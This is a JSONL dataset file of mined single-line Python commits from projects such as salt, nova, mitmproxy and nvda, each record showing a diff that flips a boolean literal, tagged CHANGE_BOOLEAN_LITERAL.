{"project": "stbgui", "commit_sha": "ee9a89efd6533997e3dc9a4e8adcb360333d01d9", "parent_sha": "6494baea016edbaab77c1d07521cf73205857085", "file_path": "lib/python/Components/UsageConfig.py", "project_url": "https://github.com/factorybuild/stbgui", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -7,7 +7,7 @@ import os\n \n def InitUsageConfig():\n \tconfig.usage = ConfigSubsection();\n-\tconfig.usage.showdish = ConfigYesNo(default = False)\n+\tconfig.usage.showdish = ConfigYesNo(default = True)\n \tconfig.usage.multibouquet = ConfigYesNo(default = False)\n \tconfig.usage.quickzap_bouquet_change = ConfigYesNo(default = False)\n \tconfig.usage.e1like_radio_mode = ConfigYesNo(default = False)\n", "before": "config . usage . showdish = ConfigYesNo ( default = False )", "after": "config . usage . showdish = ConfigYesNo ( default = True )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 38, 3, 53], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 48, 3, 53]]]"}
{"project": "stbgui", "commit_sha": "108214fd8578ffab06ec8a9c15b5d1caee7805dc", "parent_sha": "a6a90d297b35c21bc7dc12b7cc813b01e8fae6ce", "file_path": "lib/python/Components/UsageConfig.py", "project_url": "https://github.com/factorybuild/stbgui", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -105,7 +105,7 @@ def InitUsageConfig():\n \n \tconfig.epg = ConfigSubsection()\n \tconfig.epg.eit = ConfigYesNo(default = True)\n-\tconfig.epg.mhw = ConfigYesNo(default = True)\n+\tconfig.epg.mhw = ConfigYesNo(default = False)\n \tconfig.epg.freesat = ConfigYesNo(default = True)\n \tconfig.epg.viasat = ConfigYesNo(default = True)\n \tconfig.misc.showradiopic = ConfigYesNo(default = True)\n", "before": "config . epg . mhw = ConfigYesNo ( default = True )", "after": "config . epg . mhw = ConfigYesNo ( default = False )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 31, 3, 45], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 41, 3, 45]]]"}
{"project": "stbgui", "commit_sha": "4719d52a77e5f01399a5066a17af3b7eda8428e4", "parent_sha": "a2cdbfba659afcb8701b29c4b95b3e4de8b954cb", "file_path": "lib/python/Components/UsageConfig.py", "project_url": "https://github.com/factorybuild/stbgui", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -376,7 +376,7 @@ def InitUsageConfig():\n \n \tconfig.subtitles.dvb_subtitles_yellow = ConfigYesNo(default = False)\n \tconfig.subtitles.dvb_subtitles_original_position = ConfigSelection(default = \"0\", choices = [(\"0\", _(\"Original\")), (\"1\", _(\"Fixed\")), (\"2\", _(\"Relative\"))])\n-\tconfig.subtitles.dvb_subtitles_centered = ConfigYesNo(default = False)\n+\tconfig.subtitles.dvb_subtitles_centered = ConfigYesNo(default = True)\n \tconfig.subtitles.subtitle_bad_timing_delay = ConfigSelection(default = \"0\", choices = subtitle_delay_choicelist)\n \tconfig.subtitles.dvb_subtitles_backtrans = ConfigSelection(default = \"0\", choices = [\n \t\t(\"0\", _(\"No transparency\")),\n", "before": "config . subtitles . dvb_subtitles_centered = ConfigYesNo ( default = False )", "after": "config . subtitles . dvb_subtitles_centered = ConfigYesNo ( default = True )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 56, 3, 71], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 66, 3, 71]]]"}
{"project": "stbgui", "commit_sha": "6bb8796c9f3a7b9963764aa120780358574c4947", "parent_sha": "58d8c9bbfac284648531eaf7883cd0ddfedcafa1", "file_path": "lib/python/Components/UsageConfig.py", "project_url": "https://github.com/factorybuild/stbgui", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -20,7 +20,7 @@ def InitUsageConfig():\n \t\trefreshServiceList()\n \tconfig.usage.alternative_number_mode.addNotifier(alternativeNumberModeChange)\n \n-\tconfig.usage.hide_number_markers = ConfigYesNo(default = False)\n+\tconfig.usage.hide_number_markers = ConfigYesNo(default = True)\n \tconfig.usage.hide_number_markers.addNotifier(refreshServiceList)\n \n \tconfig.usage.servicetype_icon_mode = ConfigSelection(default = \"0\", choices = [(\"0\", _(\"None\")), (\"1\", _(\"Left from servicename\")), (\"2\", _(\"Right from servicename\"))])\n", "before": "config . usage . hide_number_markers = ConfigYesNo ( default = False )", "after": "config . usage . hide_number_markers = ConfigYesNo ( default = True )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 49, 3, 64], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 59, 3, 64]]]"}
{"project": "stbgui", "commit_sha": "7a956d1e23fc8799a99a4ee8cd4cdd00a1eb825a", "parent_sha": "69c5106d3609defcb26f06db1920b574eb2b8a35", "file_path": "lib/python/Components/UsageConfig.py", "project_url": "https://github.com/factorybuild/stbgui", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -227,7 +227,7 @@ def InitUsageConfig():\n \tconfig.usage.frontend_priority.addNotifier(PreferredTunerChanged)\n \n \tconfig.usage.hide_zap_errors = ConfigYesNo(default = False)\n-\tconfig.usage.hide_ci_messages = ConfigYesNo(default = False)\n+\tconfig.usage.hide_ci_messages = ConfigYesNo(default = True)\n \tconfig.usage.show_cryptoinfo = ConfigYesNo(default = True)\n \tconfig.usage.show_eit_nownext = ConfigYesNo(default = True)\n \tconfig.usage.show_vcr_scart = ConfigYesNo(default = False)\n", "before": "config . usage . hide_ci_messages = ConfigYesNo ( default = False )", "after": "config . usage . hide_ci_messages = ConfigYesNo ( default = True )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 46, 3, 61], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 56, 3, 61]]]"}
{"project": "profitbricks-sdk-python", "commit_sha": "16f717eeb4a90b6f7ea75259f72c9456d733d935", "parent_sha": "d7a1e01fb837232a796bf5e621f56da49dbc5d0c", "file_path": "examples/pb_addNewServer.py", "project_url": "https://github.com/fbrehm/profitbricks-sdk-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -208,7 +208,7 @@ USAGE\n             raise ValueError(\"user or password resolved to None\")\n         pbclient = ProfitBricksService(user, password)\n \n-        first_nic = NIC(name=\"local\", ips=[], dhcp=False, lan=lan_id)\n+        first_nic = NIC(name=\"local\", ips=[], dhcp=True, lan=lan_id)\n         volume = Volume(name=servername+\"-Disk\", size=args.storage,\n                         image=hdimage, image_password=args.imgpassword)\n         server = Server(name=servername, cores=args.cores, ram=args.ram*1024,\n", "before": "first_nic = NIC ( name = \"local\" , ips = [ ] , dhcp = False , lan = lan_id )", "after": "first_nic = NIC ( name = \"local\" , ips = [ ] , dhcp = True , lan = lan_id )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 47, 3, 57], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 52, 3, 57]]]"}
{"project": "st2", "commit_sha": "1ad57354c8c6695c577628b3efcfa25c8b44a918", "parent_sha": "1b5c88144016bcaf0fa8d9e52b7617c7eb285bca", "file_path": "st2reactor/st2reactor/container/sensor_wrapper.py", "project_url": "https://github.com/ojosdegris/st2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -147,7 +147,7 @@ class SensorService(object):\n \n         return None\n \n-    def set_value(self, name, value, ttl=None, local=False):\n+    def set_value(self, name, value, ttl=None, local=True):\n", "before": "def set_value ( self , name , value , ttl = None , local = False ) : ", "after": "def set_value ( self , name , value , ttl = None , local = True ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 48, 3, 59], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 54, 3, 59]]]"}
{"project": "salt", "commit_sha": "16b377a7d00cc5135ddd095b72a96fa8efb82c47", "parent_sha": "b748120ac158a53cc086b68ba8db9f0a1158c4b6", "file_path": "salt/modules/restartcheck.py", "project_url": "https://github.com/Mattlk13/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -372,7 +372,7 @@ def _file_changed_nilrt(full_filepath):\n     md5sum_file = os.path.join(rs_state_dir, '{0}.md5sum'.format(base_filename))\n \n     if not os.path.exists(timestamp_file) or not os.path.exists(md5sum_file):\n-        return False\n+        return True\n \n     prev_timestamp = __salt__['file.read'](timestamp_file).rstrip()\n     # Need timestamp in seconds so floor it using int()\n", "before": "return False", "after": "return True", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 9, 3, 21], [\"true:True\", \"T\"], 1], [\"Delete\", [\"false:False\", 3, 16, 3, 21]]]"}
{"project": "salt", "commit_sha": "1e4c10b1d8c798962ff9ca464dfa5fc7355a0987", "parent_sha": "b58fe7aaf4379f20fdd6888d00313657455512bc", "file_path": "salt/utils/http.py", "project_url": "https://github.com/Mattlk13/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -61,7 +61,7 @@ def query(url,\n           header_file=None,\n           username=None,\n           password=None,\n-          decode=True,\n+          decode=False,\n           decode_type='auto',\n           status=False,\n           headers=False,\n", "before": "decode = True ,", "after": "decode = False ,", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"expression_list\", 3, 18, 3, 23], [\"false:False\", \"T\"], 0], [\"Delete\", [\"true:True\", 3, 18, 3, 22]]]"}
{"project": "nova", "commit_sha": "e9eb1d69bf75c22b0ad4b50e4892a5644c78cf68", "parent_sha": "5a26a846bda054515cbd98b91bcc1a195e73f6df", "file_path": "nova/virt/libvirt/imagebackend.py", "project_url": "https://github.com/karimull/nova", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -509,7 +509,7 @@ class Rbd(Image):\n     SUPPORTS_CLONE = True\n \n     def __init__(self, instance=None, disk_name=None, path=None, **kwargs):\n-        super(Rbd, self).__init__(\"block\", \"rbd\", is_block_dev=True)\n+        super(Rbd, self).__init__(\"block\", \"rbd\", is_block_dev=False)\n         if path:\n             try:\n                 self.rbd_name = path.split('/')[1]\n", "before": "super ( Rbd , self ) . __init__ ( \"block\" , \"rbd\" , is_block_dev = True )", "after": "super ( Rbd , self ) . __init__ ( \"block\" , \"rbd\" , is_block_dev = False )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 51, 3, 68], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 64, 3, 68]]]"}
{"project": "nova", "commit_sha": "28a1e0e352d68dd115af75cafffff95db4301851", "parent_sha": "eda3900a3bc3b982c156a08ec414164ec5d8cbc2", "file_path": "nova/tests/compute/test_compute_api.py", "project_url": "https://github.com/karimull/nova", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -929,7 +929,7 @@ class _ComputeAPIUnitTestMixIn(object):\n             self.compute_api.resize(self.context, fake_inst, **extra_kwargs)\n \n     def _test_migrate(self, *args, **kwargs):\n-        self._test_resize(*args, flavor_id_passed=True, **kwargs)\n+        self._test_resize(*args, flavor_id_passed=False, **kwargs)\n \n     def test_resize(self):\n         self._test_resize()\n", "before": "self . _test_resize ( * args , flavor_id_passed = True , ** kwargs )", "after": "self . _test_resize ( * args , flavor_id_passed = False , ** kwargs )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 34, 3, 55], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 51, 3, 55]]]"}
{"project": "coala-bears", "commit_sha": "f1f1cda47926614312de7dd7bc3925cb54a5ac8d", "parent_sha": "4ad392532c02a9685dcabf299f0047b1dc4835d7", "file_path": "bears/coffee_script/CoffeeLintBear.py", "project_url": "https://github.com/muarachmann/coala-bears", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -64,7 +64,7 @@ class CoffeeLintBear:\n                         allow_this_statements: bool=True,\n                         allow_increment: bool=True,\n                         allow_no_parameters: bool=True,\n-                        allow_empty_functions: bool=True,\n+                        allow_empty_functions: bool=False,\n                         enforce_parentheses_on_non_empty_constructors: bool=True\n                         ):\n", "before": "allow_empty_functions : bool = True ,", "after": "allow_empty_functions : bool = False ,", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"expression_list\", 3, 53, 3, 58], [\"false:False\", \"T\"], 0], [\"Delete\", [\"true:True\", 3, 53, 3, 57]]]"}
{"project": "mitmproxy", "commit_sha": "7d01d5c7970c2b1b86bc6c98be5dfcaa145b1d53", "parent_sha": "820ac5152e02108f9d4e2226da1ba4369f67a4df", "file_path": "netlib/http.py", "project_url": "https://github.com/madhusai3113/mitmproxy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -272,5 +272,5 @@ def read_response(rfile, method, body_size_limit):\n     if method == \"HEAD\" or code == 204 or code == 304:\n         content = \"\"\n     else:\n-        content = read_http_body_response(rfile, headers, True, body_size_limit)\n+        content = read_http_body_response(rfile, headers, False, body_size_limit)\n     return httpversion, code, msg, headers, content\n", "before": "content = read_http_body_response ( rfile , headers , True , body_size_limit )", "after": "content = read_http_body_response ( rfile , headers , False , body_size_limit )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 42, 3, 81], [\"false:False\", \"T\"], 5], [\"Delete\", [\"true:True\", 3, 59, 3, 63]]]"}
{"project": "mitmproxy", "commit_sha": "d2f69da23545db7b081cfd45785da4dd2eb76590", "parent_sha": "a561e3bd3dee91092701fac209bf51157370bb30", "file_path": "libmproxy/flow.py", "project_url": "https://github.com/madhusai3113/mitmproxy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -666,7 +666,7 @@ class FlowMaster(controller.Master):\n         script.reloader.unwatch(script_obj)\n         self.scripts.remove(script_obj)\n     \n-    def load_script(self, command, use_reloader=True):\n+    def load_script(self, command, use_reloader=False):\n", "before": "def load_script ( self , command , use_reloader = True ) : ", "after": "def load_script ( self , command , use_reloader = False ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 36, 3, 53], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 49, 3, 53]]]"}
{"project": "mitmproxy", "commit_sha": "2c6dcac97f995dd20c05885cfb7d972a7c8d13ec", "parent_sha": "647d7601b281f2d7e12ff9073618a81d99046aad", "file_path": "mitmproxy/options.py", "project_url": "https://github.com/madhusai3113/mitmproxy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -78,7 +78,7 @@ class Options(optmanager.OptManager):\n             \"Kill extra requests during replay.\"\n         )\n         self.add_option(\n-            \"keepserving\", bool, True,\n+            \"keepserving\", bool, False,\n             \"Continue serving after client playback or file read.\"\n         )\n         self.add_option(\n", "before": "self . add_option ( \"keepserving\" , bool , True , \"Continue serving after client playback or file read.\" )", "after": "self . add_option ( \"keepserving\" , bool , False , \"Continue serving after client playback or file read.\" )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 2, 24, 5, 10], [\"false:False\", \"T\"], 5], [\"Delete\", [\"true:True\", 3, 34, 3, 38]]]"}
{"project": "pyqmix", "commit_sha": "90c69331a78167058f671d5e66d09784e28e2272", "parent_sha": "1f8c1224a4ea8ceec25927ea78e0992ccee87d44", "file_path": "pyqmix/pump.py", "project_url": "https://github.com/psyfood/pyqmix", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -164,7 +164,7 @@ class QmixPump(object):\n         else:\n             return True\n \n-    def calibrate(self, blocking_wait=True):\n+    def calibrate(self, blocking_wait=False):\n", "before": "def calibrate ( self , blocking_wait = True ) : ", "after": "def calibrate ( self , blocking_wait = False ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 25, 3, 43], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 39, 3, 43]]]"}
{"project": "zeus", "commit_sha": "96f75d3de89ec6bd6ae458776e21e59aefa0ac6f", "parent_sha": "b845ffa58fabbe6bfaed54530283693ab0787ad8", "file_path": "zeus/model_features.py", "project_url": "https://github.com/itminedu/zeus", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -80,7 +80,7 @@ class ElectionFeatures(FeaturesMixin):\n         return FeaturesMixin.__getattr__(self, name, *args, **kwargs)\n \n     def polls_feature(self, *args, **kwargs):\n-        result = True\n+        result = False\n         for poll in self.polls.all():\n             result = result and poll.check_features(*args)\n         return result\n", "before": "result = True", "after": "result = False", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 22], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 18, 3, 22]]]"}
{"project": "keras-fcn", "commit_sha": "52b2f7ff2d0fe1b3ff2865a052beee6d68915c63", "parent_sha": "052ec927f8f16c60b47a145fc963d2ab949b6dc1", "file_path": "fcn/fcn.py", "project_url": "https://github.com/JihongJu/keras-fcn", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -197,7 +197,7 @@ def _handle_data_format():\n         COL_AXIS = 3\n \n \n-def FCN(basenet='vgg16', trainable_base=False,\n+def FCN(basenet='vgg16', trainable_base=True,\n         num_output=21, input_shape=(None, None, 3),\n         weights='imagenet'):\n", "before": "def FCN ( basenet = 'vgg16' , trainable_base = False , num_output = 21 , input_shape = ( None , None , 3 ) , weights = 'imagenet' ) : ", "after": "def FCN ( basenet = 'vgg16' , trainable_base = True , num_output = 21 , input_shape = ( None , None , 3 ) , weights = 'imagenet' ) : ", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 26, 3, 46], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 41, 3, 46]]]"}
{"project": "Griduniverse", "commit_sha": "07fb8f3f0383fad70f973bf27e6e273a6dea8839", "parent_sha": "64fa9a0f0a90c8e2f0c3070694700fd67932eef1", "file_path": "experiment.py", "project_url": "https://github.com/Dallinger/Griduniverse", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -496,7 +496,7 @@ class Griduniverse(dallinger.experiments.Experiment):\n             block_size=10,\n             padding=1,\n             num_colors=2,\n-            respawn_food=False,\n+            respawn_food=True,\n             food_visible=True,\n             food_reward=1,\n             food_pg_multiplier=0,\n", "before": "respawn_food = False ,", "after": "respawn_food = True ,", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"expression_list\", 3, 26, 3, 32], [\"true:True\", \"T\"], 0], [\"Delete\", [\"false:False\", 3, 26, 3, 31]]]"}
{"project": "Griduniverse", "commit_sha": "f9b0af57a290810e17c6a28ddc9b837313d32883", "parent_sha": "0bf62e0f4cc4379e5403fefb912b0af31559ace0", "file_path": "experiment.py", "project_url": "https://github.com/Dallinger/Griduniverse", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -185,7 +185,7 @@ class Gridworld(object):\n         self.seasonal_growth_rate = kwargs.get('seasonal_growth_rate', 1)\n \n         # Questionnaire\n-        self.DIFI_question = kwargs.get('DIFI_question', True)\n+        self.DIFI_question = kwargs.get('DIFI_question', False)\n         self.DIFI_group_label = kwargs.get('DIFI_group_label', 'Group')\n         self.DIFI_group_image = kwargs.get('DIFI_group_image', '/static/images/group.jpg')\n \n", "before": "self . DIFI_question = kwargs . get ( 'DIFI_question' , True )", "after": "self . DIFI_question = kwargs . get ( 'DIFI_question' , False )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 40, 3, 63], [\"false:False\", \"T\"], 3], [\"Delete\", [\"true:True\", 3, 58, 3, 62]]]"}
{"project": "Griduniverse", "commit_sha": "0ad4bbcc094c32b3c9d068c03ce6f341f3162a18", "parent_sha": "bb5defbb8464002f349d9cb71078e5b60608b596", "file_path": "dlgr/griduniverse/experiment.py", "project_url": "https://github.com/Dallinger/Griduniverse", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -195,7 +195,7 @@ class Gridworld(object):\n         self.motion_tremble_rate = kwargs.get('motion_tremble_rate', 0)\n \n         # Components\n-        self.show_chatroom = kwargs.get('show_chatroom', True)\n+        self.show_chatroom = kwargs.get('show_chatroom', False)\n         self.show_grid = kwargs.get('show_grid', True)\n \n         # Identity\n", "before": "self . show_chatroom = kwargs . get ( 'show_chatroom' , True )", "after": "self . show_chatroom = kwargs . get ( 'show_chatroom' , False )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 40, 3, 63], [\"false:False\", \"T\"], 3], [\"Delete\", [\"true:True\", 3, 58, 3, 62]]]"}
{"project": "guider", "commit_sha": "da17602b3e82a5e28a2ea33d291106405b0c62ef", "parent_sha": "071a9120e28f5cb06e9b49190bd1d8d49df9fe9d", "file_path": "guider.py", "project_url": "https://github.com/sfrias/guider", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -5912,7 +5912,7 @@ class SystemManager(object):\n                 SystemManager.printInfo(\"Use %s:%d as server address\" % \\\n                     (SystemManager.addrAsServer.ip, SystemManager.addrAsServer.port))\n \n-            elif option == 'X' and SystemManager.isTopMode() is False:\n+            elif option == 'X' and SystemManager.isTopMode() is True:\n                 if SystemManager.findOption('x') is False:\n                     SystemManager.printError(\\\n                         \"wrong option with -X, use also -x option to request service\")\n", "before": "elif option == 'X' and SystemManager . isTopMode ( ) is False", "after": "elif option == 'X' and SystemManager . isTopMode ( ) is True", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 36, 3, 70], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 65, 3, 70]]]"}
{"project": "Announced", "commit_sha": "88aef32834be4b154946e3d401a0dee8d1909926", "parent_sha": "b58cd10a61eb4e0fbf64768162b1c7f061bd8e8c", "file_path": "trackers/develop.py", "project_url": "https://github.com/dawtmaytrikx/Announced", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -46,4 +46,4 @@ def get_torrent_link(torrent_id, torrent_name):\n # Initialize tracker\n @asyncio.coroutine\n def init():\n-    return True\n+    return False\n", "before": "return True", "after": "return False", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 5, 3, 16], [\"false:False\", \"T\"], 1], [\"Delete\", [\"true:True\", 3, 12, 3, 16]]]"}
{"project": "nvda", "commit_sha": "cd8cce48dd1cdfedc6af108950742c63bc2fb4d9", "parent_sha": "a96cd612d8104769cf6c5fe74633e700fca2bebe", "file_path": "source/IAccessibleHandler.py", "project_url": "https://github.com/mariuszkrzaczkowski/nvda", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -628,7 +628,7 @@ def processFocusWinEvent(window,objectID,childID,force=False):\n \t# However, we don't want to ignore focus if the child ID isn't 0,\n \t# as this is a child control and the SDM MSAA events don't handle child controls.\r\n \tif childID==0 and not windowClassName.startswith('bosa_sdm') and winUser.getClassName(winUser.getAncestor(window,winUser.GA_PARENT)).startswith('bosa_sdm'):\r\n-\t\treturn True\r\n+\t\treturn False\r\n \trootWindow=winUser.getAncestor(window,winUser.GA_ROOT)\r\n \t# If this window's root window is not the foreground window and this window or its root window is not a popup window:\r\n \tif rootWindow!=winUser.getForegroundWindow() and not (winUser.getWindowStyle(window) & winUser.WS_POPUP or winUser.getWindowStyle(rootWindow)&winUser.WS_POPUP):\r\n", "before": "return True", "after": "return False", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 3, 3, 14], [\"false:False\", \"T\"], 1], [\"Delete\", [\"true:True\", 3, 10, 3, 14]]]"}
{"project": "gala", "commit_sha": "519c83504ab3853206b038032ef2218ffbbdef92", "parent_sha": "086f840bbf6bb5bb081e1d1d70538297410ca0cc", "file_path": "ray/agglo.py", "project_url": "https://github.com/jakirkham/gala", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -206,7 +206,7 @@ class Rag(Graph):\n     def get_neighbor_idxs_lean(self, idxs, connectivity=1):\n         return morpho.get_neighbor_idxs(self.watershed, idxs, connectivity)\n \n-    def set_probabilities(self, probs=array([]), normalize=True):\n+    def set_probabilities(self, probs=array([]), normalize=False):\n         if len(probs) == 0:\n             self.probabilities = zeros_like(self.watershed)\n             self.probabilities_r = self.probabilities.ravel()\n", "before": "def set_probabilities ( self , probs = array ( [ ] ) , normalize = True ) : if len ( probs ) == 0 : self . probabilities = zeros_like ( self . watershed ) self . probabilities_r = self . probabilities . ravel ( )", "after": "def set_probabilities ( self , probs = array ( [ ] ) , normalize = False ) : if len ( probs ) == 0 : self . probabilities = zeros_like ( self . watershed ) self . probabilities_r = self . probabilities . ravel ( )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 50, 3, 64], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 60, 3, 64]]]"}
{"project": "fieldsight-kobocat", "commit_sha": "d27df9472554774c7b935362e9dce661a7cda76a", "parent_sha": "5e55c561a49fda676512b4e03def11e03217e03c", "file_path": "odk_viewer/models/parsed_instance.py", "project_url": "https://github.com/awemulya/fieldsight-kobocat", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -263,7 +263,7 @@ class ParsedInstance(models.Model):\n         self.lat = g.get(u'latitude')\n         self.lng = g.get(u'longitude')\n \n-    def save(self, async=True, *args, **kwargs):\n+    def save(self, async=False, *args, **kwargs):\n         self._set_start_time()\n         self._set_end_time()\n         self._set_geopoint()\n", "before": "def save ( self , async = True , * args , ** kwargs ) : self . _set_start_time ( ) self . _set_end_time ( ) self . _set_geopoint ( )", "after": "def save ( self , async = False , * args , ** kwargs ) : self . _set_start_time ( ) self . _set_end_time ( ) self . _set_geopoint ( )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 20, 3, 30], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 26, 3, 30]]]"}
{"project": "fieldsight-kobocat", "commit_sha": "93a9f16d6ea3940d4fd6332ceb700cb35a481c6a", "parent_sha": "1b5d95fb70cedae4ed1b5229c60b94cf599c54d0", "file_path": "onadata/libs/utils/export_tools.py", "project_url": "https://github.com/awemulya/fieldsight-kobocat", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -846,7 +846,7 @@ def query_mongo(username, id_string, query=None, hide_deleted=True):\n \n \n def should_create_new_export(xform, export_type):\n-    return True\n+    return False\n     if Export.objects.filter(\n             xform=xform, export_type=export_type).count() == 0\\\n             or Export.exports_outdated(xform, export_type=export_type):\n", "before": "return True", "after": "return False", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 5, 3, 16], [\"false:False\", \"T\"], 1], [\"Delete\", [\"true:True\", 3, 12, 3, 16]]]"}
{"project": "opengeode", "commit_sha": "834cd2b4a754a7b938c97685ffb622fd4b0d309e", "parent_sha": "39242a270b69c1c66791678fd3d4d10579a27054", "file_path": "opengeode/opengeode.py", "project_url": "https://github.com/esa/opengeode", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -884,7 +884,7 @@ class SDL_Scene(QtGui.QGraphicsScene, object):\n                 self.refresh()\n \n \n-    def sdl_to_statechart(self, basic=False):\n+    def sdl_to_statechart(self, basic=True):\n         ''' Create a graphviz representation of the SDL model '''\n         pr_raw = Pr.parse_scene(self)\n", "before": "def sdl_to_statechart ( self , basic = False ) : ''' Create a graphviz representation of the SDL model ''' pr_raw = Pr . parse_scene ( self )", "after": "def sdl_to_statechart ( self , basic = True ) : ''' Create a graphviz representation of the SDL model ''' pr_raw = Pr . parse_scene ( self )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 33, 3, 44], [\"true:True\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 39, 3, 44]]]"}
{"project": "nutils", "commit_sha": "ecf95711a45b512caddf6d6434fb8263cd11f9b6", "parent_sha": "9f6afb49db8e1f95bd6a2ef0a81c4d8f59f681e1", "file_path": "nutils/topology.py", "project_url": "https://github.com/evalf/nutils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -90,7 +90,7 @@ class Topology( object ):\n     items = ( self.groups[it] for it in item.split( ',' ) )\n     return sum( items, items.next() )\n \n-  def elem_eval( self, funcs, ischeme, separate=True, title='evaluating' ):\n+  def elem_eval( self, funcs, ischeme, separate=False, title='evaluating' ):\n     'element-wise evaluation'\n \n     log.context( title )\n", "before": "def elem_eval ( self , funcs , ischeme , separate = True , title = 'evaluating' ) : 'element-wise evaluation' log . context ( title )", "after": "def elem_eval ( self , funcs , ischeme , separate = False , title = 'evaluating' ) : 'element-wise evaluation' log . context ( title )", "sstub_pattern": "CHANGE_BOOLEAN_LITERAL", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 40, 3, 53], [\"false:False\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 49, 3, 53]]]"}
